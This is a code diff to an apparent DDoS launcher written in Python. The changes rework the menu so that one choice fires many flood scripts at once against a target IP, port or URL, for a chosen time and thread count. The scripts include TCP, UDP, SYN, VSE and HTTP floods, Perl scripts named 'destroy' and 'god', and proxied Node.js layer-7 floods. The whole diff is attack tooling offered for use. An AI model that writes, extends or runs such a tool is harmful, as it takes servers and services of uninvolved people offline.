@@ -488,11 +488,8 @@ class Tool:
               |___/
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
-		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
-		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
-		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
-		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Zeus-Lord: Source Engine specific flood")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Dpr-Fuck: Machines Designed Like Monsters")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -503,8 +500,13 @@ class Tool:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
+					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
 					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -513,39 +515,13 @@ class Tool:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
-				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['03', '3']:
-				try:
-					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
-					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
-				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['04', '4']:
-				try:
-					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
-					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
-				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['05', '5']:
-				try:
-					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L4/Ork-Wizard {ip} {port} {thread}'], shell=True)
+					subprocess.run([f'screen -dm perl utils/L4/home {ip} {port} {size} {floodtime}'], shell=True)
+					subprocess.run([f'screen -dm perl utils/L4/destroy {ip} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm perl utils/L4/god {ip} {port} 65500 {floodtime}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -615,6 +591,7 @@ class Tool:
 					username = int(input(f"{Color.LG} [>] Username: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/proxy.txt 512'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Zeus-Lord {url} {floodtime} 850 15 utils/proxy.txt'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
